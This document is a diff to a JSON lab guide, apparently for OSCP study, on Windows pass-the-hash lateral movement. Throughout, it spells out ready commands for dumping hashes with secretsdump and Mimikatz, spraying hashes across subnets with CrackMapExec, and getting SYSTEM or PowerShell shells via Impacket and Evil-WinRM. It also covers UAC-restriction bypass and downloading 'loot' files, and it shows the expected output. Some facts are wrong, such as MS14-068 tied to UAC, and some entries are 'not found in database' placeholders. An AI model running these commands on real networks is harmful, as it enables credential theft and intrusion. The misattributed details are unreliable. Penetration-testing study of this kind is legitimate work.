@@ -29,7 +29,7 @@
             "secretsdump-hashes"
           ],
           "expected_outcome": "Understand NTLM authentication flow: (1) Workstation requests login to file server, (2) Server sends 16-byte challenge: 0x1122334455667788, (3) Workstation encrypts challenge using NTLM hash as key (DES-based encryption), (4) Workstation sends encrypted response, (5) Server encrypts same challenge with hash stored in SAM, (6) Server compares: if responses match, authentication succeeds. INSIGHT: Step 3 only needs hash (31d6cfe0d16ae931b73c59d7e0c089c0), not password. Tools like Impacket and Mimikatz replicate this flow. When you pass hash to psexec, it uses hash to respond to NTLM challenges. Server doesn't know you're using hash instead of password - the protocol is identical.",
-          "why_this_works": "NTLM (NT LAN Manager) is legacy authentication protocol from Windows NT 3.1 (1993). It uses challenge-response to avoid transmitting passwords over network. NTLM hash calculation: (1) Take password 'P@ssw0rd', (2) Convert to Unicode, (3) Apply MD4 hash → 32 hex characters (NTLM hash). During authentication, client uses this hash (not password) to encrypt challenges. PROBLEM: If attacker obtains hash, they can authenticate just like legitimate user. This is called 'pass-the-hash' - passing hash instead of password. Microsoft designed this for password change scenarios (client needs to prove current password without transmitting it), but it enables lateral movement. UAC mitigations added in 2014 (MS14-068) restrict non-RID-500 local admin hashes over network, but domain account hashes still work."
+          "why_this_works": "NTLM (NT LAN Manager) is legacy authentication protocol from Windows NT 3.1 (1993). It uses challenge-response to avoid transmitting passwords over network. NTLM hash calculation: (1) Take password 'P@ssw0rd', (2) Convert to Unicode, (3) Apply MD4 hash \u2192 32 hex characters (NTLM hash). During authentication, client uses this hash (not password) to encrypt challenges. PROBLEM: If attacker obtains hash, they can authenticate just like legitimate user. This is called 'pass-the-hash' - passing hash instead of password. Microsoft designed this for password change scenarios (client needs to prove current password without transmitting it), but it enables lateral movement. UAC mitigations added in 2014 (MS14-068) restrict non-RID-500 local admin hashes over network, but domain account hashes still work."
         },
         {
           "title": "Scenario 2: Hash Extraction and Format Validation",
@@ -57,13 +57,13 @@
         {
           "title": "Scenario 4: Lateral Movement with Impacket Pass-the-Hash",
           "context": "CrackMapExec confirmed hash 'fc525c9683e8fe067095ba2ddc971889' grants local admin access on 192.168.50.100. Now you need interactive shell to dump credentials, search files, or install persistence. Impacket suite provides three pass-the-hash tools: psexec (SYSTEM shell, binary upload), wmiexec (fileless, semi-interactive), smbexec (fileless, similar to wmiexec). Choose based on scenario.",
-          "approach": "PSExec (default choice - SYSTEM shell, most reliable): impacket-psexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@192.168.50.100. Syntax: -hashes LM:NTLM (use empty LM hash → :NTLM). WMIExec (if PSExec detected/blocked): impacket-wmiexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@192.168.50.100. Provides semi-interactive shell via WMI, no binary upload (stealthier). SMBExec (alternative to WMI): impacket-smbexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@192.168.50.100. Uses SMB + task scheduler, no service creation. All three tools accept -hashes flag for pass-the-hash.",
+          "approach": "PSExec (default choice - SYSTEM shell, most reliable): impacket-psexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@192.168.50.100. Syntax: -hashes LM:NTLM (use empty LM hash \u2192 :NTLM). WMIExec (if PSExec detected/blocked): impacket-wmiexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@192.168.50.100. Provides semi-interactive shell via WMI, no binary upload (stealthier). SMBExec (alternative to WMI): impacket-smbexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@192.168.50.100. Uses SMB + task scheduler, no service creation. All three tools accept -hashes flag for pass-the-hash.",
           "commands": [
             "pth-impacket-psexec",
             "pth-impacket-wmiexec",
             "pth-impacket-smbexec"
           ],
-          "expected_outcome": "PSExec output: '[*] Requesting shares on 192.168.50.100..... [*] Found writable share ADMIN$ [*] Uploading file kLqNDASz.exe [*] Opening SVCManager on 192.168.50.100..... [*] Creating service pZmQ on 192.168.50.100..... [*] Starting service pZmQ..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.19045.2006] (c) Microsoft Corporation. All rights reserved. C:\\Windows\\system32>'. Run 'whoami' → 'nt authority\\system'. You have SYSTEM shell without password - only hash used for authentication. WMIExec output: '[*] SMBv3.0 dialect used [!] Launching semi-interactive shell - Careful what you execute [!] Press help for extra shell commands C:\\>'. Semi-interactive means: each command executes separately (no persistent cmd.exe process), output returns to Kali terminal. Less interactive than PSExec but fileless (no uploaded binary).",
+          "expected_outcome": "PSExec output: '[*] Requesting shares on 192.168.50.100..... [*] Found writable share ADMIN$ [*] Uploading file kLqNDASz.exe [*] Opening SVCManager on 192.168.50.100..... [*] Creating service pZmQ on 192.168.50.100..... [*] Starting service pZmQ..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.19045.2006] (c) Microsoft Corporation. All rights reserved. C:\\Windows\\system32>'. Run 'whoami' \u2192 'nt authority\\system'. You have SYSTEM shell without password - only hash used for authentication. WMIExec output: '[*] SMBv3.0 dialect used [!] Launching semi-interactive shell - Careful what you execute [!] Press help for extra shell commands C:\\>'. Semi-interactive means: each command executes separately (no persistent cmd.exe process), output returns to Kali terminal. Less interactive than PSExec but fileless (no uploaded binary).",
           "why_this_works": "Impacket implements pass-the-hash by handling NTLM authentication natively in Python. When you provide -hashes :fc525c9..., Impacket: (1) Connects to target SMB/RPC service, (2) Receives NTLM challenge from server, (3) Encrypts challenge using provided hash (without ever needing password), (4) Sends response, (5) Server validates response against stored hash, (6) Authentication succeeds. PSExec then uploads binary and creates service (requires admin). WMIExec uses WMI Win32_Process.Create() method (requires admin, no upload). SMBExec uses scheduled tasks via SMB (requires admin, no service creation). All three work identically to password-based authentication from server's perspective - NTLM protocol doesn't distinguish between 'user knows password' vs 'attacker has hash'."
         },
         {
@@ -75,18 +75,18 @@
             "secretsdump-hashes",
             "pth-impacket-psexec"
           ],
-          "expected_outcome": "secretsdump output shows two local admin accounts: 'Administrator:500:...:8846f7eaee8fb117ad06bdd830b7586c:::' (RID 500 = built-in), 'admin:1001:...:8846f7eaee8fb117ad06bdd830b7586c:::' (RID 1001 = user-created). Notice SAME NTLM hash (8846f7...) for both - same password. Test RID-1001 hash: 'impacket-psexec -hashes :8846f7... admin@192.168.50.102' → STATUS_ACCESS_DENIED (UAC blocked). Test RID-500 hash: 'impacket-psexec -hashes :8846f7... Administrator@192.168.50.102' → SUCCESS! C:\\Windows\\system32> prompt. INSIGHT: Use Administrator account name (RID 500) even though hash is identical. UAC filter checks RID, not hash. Alternative: If you have domain account hash (corp\\dadmin:fc525c...), use that - UAC restriction doesn't apply to domain accounts: 'impacket-psexec -hashes :fc525c... corp/dadmin@192.168.50.102'.",
+          "expected_outcome": "secretsdump output shows two local admin accounts: 'Administrator:500:...:8846f7eaee8fb117ad06bdd830b7586c:::' (RID 500 = built-in), 'admin:1001:...:8846f7eaee8fb117ad06bdd830b7586c:::' (RID 1001 = user-created). Notice SAME NTLM hash (8846f7...) for both - same password. Test RID-1001 hash: 'impacket-psexec -hashes :8846f7... admin@192.168.50.102' \u2192 STATUS_ACCESS_DENIED (UAC blocked). Test RID-500 hash: 'impacket-psexec -hashes :8846f7... Administrator@192.168.50.102' \u2192 SUCCESS! C:\\Windows\\system32> prompt. INSIGHT: Use Administrator account name (RID 500) even though hash is identical. UAC filter checks RID, not hash. Alternative: If you have domain account hash (corp\\dadmin:fc525c...), use that - UAC restriction doesn't apply to domain accounts: 'impacket-psexec -hashes :fc525c... corp/dadmin@192.168.50.102'.",
           "why_this_works": "UAC (User Account Control) Remote Restrictions introduced in Windows Vista, strengthened in 2014 patch KB2871997. PURPOSE: Prevent lateral movement using local admin accounts (except RID-500). MECHANISM: When non-RID-500 local admin authenticates over network, Windows filters their token to remove admin rights - they get standard user privileges even though they're in Administrators group. This breaks PSExec, WMI, and other admin-required techniques. EXCEPTION: Built-in Administrator account (RID 500) is exempt from filtering - it always gets full admin token over network. OSCP IMPLICATION: When dumping SAM hashes, always check RID field. RID 500 = gold for lateral movement. RID 1000+ = might work on some machines (depending on patch level) but unreliable. Domain account hashes are NOT affected by UAC restrictions - they get full admin token if they're in local Administrators group."
         },
         {
           "title": "Scenario 6: Evil-WinRM Pass-the-Hash for Interactive Shell",
           "context": "You have NTLM hash and need best interactive shell from Kali (better than Impacket's semi-interactive WMIExec, more features than PSExec). Target has WinRM enabled (port 5985 open). Evil-WinRM supports pass-the-hash and provides rich PowerShell remoting with file upload/download.",
-          "approach": "Syntax: evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>. Example: evil-winrm -i 192.168.50.100 -u administrator -H fc525c9683e8fe067095ba2ddc971889. Do NOT include colon prefix for hash (common mistake: -H :fc525c... → wrong, -H fc525c... → correct). Do NOT include LM hash (Evil-WinRM only needs NTLM). Once connected, you get fully interactive PowerShell prompt with: tab completion, command history (up arrow), multi-line commands, built-in upload/download commands.",
+          "approach": "Syntax: evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>. Example: evil-winrm -i 192.168.50.100 -u administrator -H fc525c9683e8fe067095ba2ddc971889. Do NOT include colon prefix for hash (common mistake: -H :fc525c... \u2192 wrong, -H fc525c... \u2192 correct). Do NOT include LM hash (Evil-WinRM only needs NTLM). Once connected, you get fully interactive PowerShell prompt with: tab completion, command history (up arrow), multi-line commands, built-in upload/download commands.",
           "commands": [
             "evil-winrm-hash",
             "pth-evil-winrm"
           ],
-          "expected_outcome": "Evil-WinRM connection output: 'Evil-WinRM shell v3.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\administrator\\Documents>'. You have interactive PowerShell. Test commands: 'whoami' → 'corp\\administrator', 'hostname' → 'WORKSTATION01', 'Get-Process' → list of running processes. Upload enumeration script: 'upload /opt/PowerUp.ps1 C:\\Temp\\PowerUp.ps1' → [+] Upload successful. Run script: 'Import-Module C:\\Temp\\PowerUp.ps1; Invoke-AllChecks' → PowerUp enumeration output. Download loot: 'download C:\\Users\\admin\\Desktop\\passwords.txt /home/kali/loot/passwords.txt' → [+] Download successful. Evil-WinRM provides best user experience for pass-the-hash lateral movement - prefer this over Impacket when WinRM available.",
+          "expected_outcome": "Evil-WinRM connection output: 'Evil-WinRM shell v3.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\administrator\\Documents>'. You have interactive PowerShell. Test commands: 'whoami' \u2192 'corp\\administrator', 'hostname' \u2192 'WORKSTATION01', 'Get-Process' \u2192 list of running processes. Upload enumeration script: 'upload /opt/PowerUp.ps1 C:\\Temp\\PowerUp.ps1' \u2192 [+] Upload successful. Run script: 'Import-Module C:\\Temp\\PowerUp.ps1; Invoke-AllChecks' \u2192 PowerUp enumeration output. Download loot: 'download C:\\Users\\admin\\Desktop\\passwords.txt /home/kali/loot/passwords.txt' \u2192 [+] Download successful. Evil-WinRM provides best user experience for pass-the-hash lateral movement - prefer this over Impacket when WinRM available.",
           "why_this_works": "Evil-WinRM is Ruby-based tool that implements PowerShell Remoting protocol with pass-the-hash support. WinRM (Windows Remote Management) uses HTTP/HTTPS (ports 5985/5986) for transport and supports NTLM authentication. When you provide -H flag, Evil-WinRM: (1) Initiates WinRM connection over HTTP, (2) Receives NTLM challenge, (3) Uses provided hash to compute challenge response, (4) Authenticates without password. WinRM then spawns PowerShell runspace in user's context (not SYSTEM like PSExec). Advantages over Impacket: (1) Fully interactive (real PowerShell session, not semi-interactive), (2) Tab completion works, (3) Multi-line commands supported, (4) Built-in upload/download (Impacket requires separate SMB session), (5) Menu system for common tasks. Disadvantages: (1) Requires WinRM enabled (not always available), (2) Runs as user (not SYSTEM), (3) Creates WinRM event logs (Event ID 6 in Microsoft-Windows-WinRM/Operational)."
         }
       ],
@@ -95,55 +95,131 @@
           "title": "Phase 1: Hash Extraction",
           "notes": "Extract NTLM hashes from compromised systems using: (1) secretsdump (from Kali) - requires SAM/SYSTEM registry hives or admin credentials for remote dump, (2) Mimikatz (from Windows) - requires SYSTEM or SeDebugPrivilege for LSASS memory access, (3) Manual registry dump - 'reg save HKLM\\SAM sam.hive' then parse offline. Output format: 'username:rid:lm:ntlm:::'. Always verify RID field - RID 500 (Administrator) bypasses UAC restrictions. Document username-to-hash mapping for tracking.",
           "commands": [
-            "secretsdump-hashes",
-            "mimikatz-logonpasswords",
-            "pth-verify-hash-format"
+            {
+              "id": "secretsdump-hashes",
+              "example": "impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'",
+              "shows": "Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor..."
+            },
+            {
+              "id": "mimikatz-logonpasswords",
+              "example": "[Command mimikatz-logonpasswords not found in database]",
+              "shows": "See command documentation"
+            },
+            {
+              "id": "pth-verify-hash-format",
+              "example": "crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
+              "shows": "[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)"
+            }
           ]
         },
         {
           "title": "Phase 2: Hash Validation and Spraying",
           "notes": "Before attempting exploitation, validate hash and identify where it grants access. Use CrackMapExec for fast testing: (1) Single target - 'crackmapexec smb <TARGET> -u <USER> -H <HASH> --local-auth', look for Pwn3d! indicator. (2) Subnet spray - 'crackmapexec smb 192.168.50.0/24 -u admin -H <HASH> --local-auth', identify all vulnerable machines. (3) Domain spray - 'crackmapexec smb <DC> -u <USER> -H <HASH> -d <DOMAIN>', test domain account hash. Hash spraying exploits password reuse - same local admin password across workstations is common misconfiguration.",
           "commands": [
-            "pth-cme-spray",
-            "cme-smb-auth-test",
-            "pth-verify-hash-format"
+            {
+              "id": "pth-cme-spray",
+              "example": "crackmapexec smb 192.168.50.0/24 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
+              "shows": "[+] <TARGET> (Pwn3d!)"
+            },
+            {
+              "id": "cme-smb-auth-test",
+              "example": "[Command cme-smb-auth-test not found in database]",
+              "shows": "See command documentation"
+            },
+            {
+              "id": "pth-verify-hash-format",
+              "example": "crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
+              "shows": "[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)"
+            }
           ]
         },
         {
           "title": "Phase 3: Lateral Movement Tool Selection",
           "notes": "Choose pass-the-hash tool based on requirements: (1) Evil-WinRM - Best interactive shell, requires WinRM enabled (port 5985/5986 open). Use when you need PowerShell interactivity and file transfer. (2) Impacket PSExec - SYSTEM shell, most reliable, writes binary to disk. Use when you need highest privileges. (3) Impacket WMIExec - Fileless, semi-interactive, stealthier than PSExec. Use when AV is concern. (4) Impacket SMBExec - Fileless via task scheduler, alternative to WMI. All accept -hashes :NTLM or -H NTLM syntax.",
           "commands": [
-            "pth-impacket-psexec",
-            "pth-impacket-wmiexec",
-            "pth-impacket-smbexec",
-            "evil-winrm-hash"
+            {
+              "id": "pth-impacket-psexec",
+              "example": "impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73",
+              "shows": "[*] Requesting shares on <TARGET>"
+            },
+            {
+              "id": "pth-impacket-wmiexec",
+              "example": "impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73",
+              "shows": "[*] SMBv3.0 dialect used"
+            },
+            {
+              "id": "pth-impacket-smbexec",
+              "example": "impacket-smbexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73",
+              "shows": "[!] Launching semi-interactive shell"
+            },
+            {
+              "id": "evil-winrm-hash",
+              "example": "evil-winrm -i 192.168.50.73 -u administrator -H 64f12cddaa88057e06a81b54e73b949b",
+              "shows": "Evil-WinRM shell v3"
+            }
           ]
         },
         {
           "title": "Phase 4: UAC Restriction Bypass",
           "notes": "Microsoft KB2871997 (2014) blocks network authentication for local admin accounts except RID-500 Administrator. SYMPTOM: CrackMapExec shows Pwn3d! but psexec gives STATUS_ACCESS_DENIED. SOLUTION: (1) Use built-in Administrator account (RID 500) hash instead of user-created admin account, (2) Use domain account hash (UAC restriction only affects local accounts), (3) Check patch level - unpatched systems don't have restriction. Always prioritize RID-500 hash extraction from SAM dumps.",
           "commands": [
-            "secretsdump-hashes",
-            "pth-impacket-psexec",
-            "pth-verify-hash-format"
+            {
+              "id": "secretsdump-hashes",
+              "example": "impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'",
+              "shows": "Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor..."
+            },
+            {
+              "id": "pth-impacket-psexec",
+              "example": "impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73",
+              "shows": "[*] Requesting shares on <TARGET>"
+            },
+            {
+              "id": "pth-verify-hash-format",
+              "example": "crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
+              "shows": "[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)"
+            }
           ]
         },
         {
           "title": "Phase 5: Post-Compromise Credential Harvesting",
           "notes": "After successful pass-the-hash lateral movement, immediately dump credentials from new machine for further access: (1) SAM hashes - 'reg save HKLM\\SAM' then secretsdump, (2) LSASS memory - Mimikatz sekurlsa::logonpasswords (requires SYSTEM shell from PSExec), (3) Domain cached credentials - secretsdump -security option. Test newly obtained hashes with CrackMapExec spray - identify additional targets. Rinse and repeat until Domain Admin obtained or all targets compromised.",
           "commands": [
-            "secretsdump-hashes",
-            "mimikatz-logonpasswords",
-            "pth-cme-spray"
+            {
+              "id": "secretsdump-hashes",
+              "example": "impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'",
+              "shows": "Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor..."
+            },
+            {
+              "id": "mimikatz-logonpasswords",
+              "example": "[Command mimikatz-logonpasswords not found in database]",
+              "shows": "See command documentation"
+            },
+            {
+              "id": "pth-cme-spray",
+              "example": "crackmapexec smb 192.168.50.0/24 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
+              "shows": "[+] <TARGET> (Pwn3d!)"
+            }
           ]
         },
         {
           "title": "Phase 6: Troubleshooting Pass-the-Hash Failures",
           "notes": "Common failures: (1) STATUS_LOGON_FAILURE - Hash is wrong (verify format: 32 hex chars), account disabled, or hash changed. Retest with CrackMapExec. (2) STATUS_ACCESS_DENIED - Hash works but UAC blocking (use RID-500 or domain account). (3) Connection timeout - Firewall blocking (verify ports with nmap). (4) Hash format error - Impacket uses -hashes :NTLM (colon prefix for empty LM), Evil-WinRM uses -H NTLM (no colon). (5) WinRM hash fails but SMB works - User not in Remote Management Users group (try PSExec instead).",
           "commands": [
-            "pth-verify-hash-format",
-            "cme-smb-auth-test",
-            "lateral-movement-troubleshooting"
+            {
+              "id": "pth-verify-hash-format",
+              "example": "crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
+              "shows": "[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)"
+            },
+            {
+              "id": "cme-smb-auth-test",
+              "example": "[Command cme-smb-auth-test not found in database]",
+              "shows": "See command documentation"
+            },
+            {
+              "id": "lateral-movement-troubleshooting",
+              "example": "# Test credentials: crackmapexec smb 192.168.45.100 -u admin -p password\n# Test admin access: crackmapexec smb 192.168.45.100 -u admin -p password --shares\n# Test hash: crackmapexec smb 192.168.45.100 -u admin -H abc123...\n# Check UAC restriction: If local admin hash fails but domain user works, UAC blocking PTH\n# Verify ports: sudo nmap -p 135,445,5985 -Pn -v 192.168.45.100\n# Check firewall: Test-NetConnection 192.168.45.100 -Port 80 from Windows\n# Time sync: net time \\\\192.168.45.100 (Kerberos requires <5 min time skew)\n# Service status: Get-Service WinRM,RpcSs -ComputerName 192.168.45.100",
+              "shows": "[+] Pwn3d! from CrackMapExec (admin access confirmed)"
+            }
           ]
         }
       ],
